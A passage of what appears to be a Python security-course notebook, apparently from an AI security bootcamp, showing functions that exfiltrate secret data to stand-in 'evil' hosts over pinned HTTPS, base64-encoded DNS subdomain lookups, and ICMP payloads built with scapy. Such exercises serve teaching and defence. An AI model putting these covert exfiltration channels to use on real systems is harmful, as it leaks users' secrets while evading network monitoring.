...
def make_evil_request_pinned(secret_data: str) -> Optional[str]:
    ...
    resp = requests.get(
        "https://ev1l.aisb.dev/exfiltrate", params={"data": secret_data}, timeout=5, verify="isrg-root-x1.pem"
    )
    if resp.status_code != 200:
        return None
    return resp.text
...
def make_evil_request_dns(secret_data: str) -> Optional[str]:
    ...
    try:
        b = bytes(secret_data.encode())
        b64_ecoded = base64.urlsafe_b64encode(b).decode()
        domain = f"{b64_ecoded}.evil.aisb.dev"
        txt = resolver.resolve(
            domain,
            "TXT",
        )
        return txt[0].to_text()
    except Exception:
        return None
...
# %%
from scapy.all import IP, ICMP, sr1, Raw, send, conf, L3RawSocket
...
def make_evil_request_icmp(secret_data: str) -> Optional[str]:
    ...
    try:
        ...
        data = Raw(load=secret_data.encode())
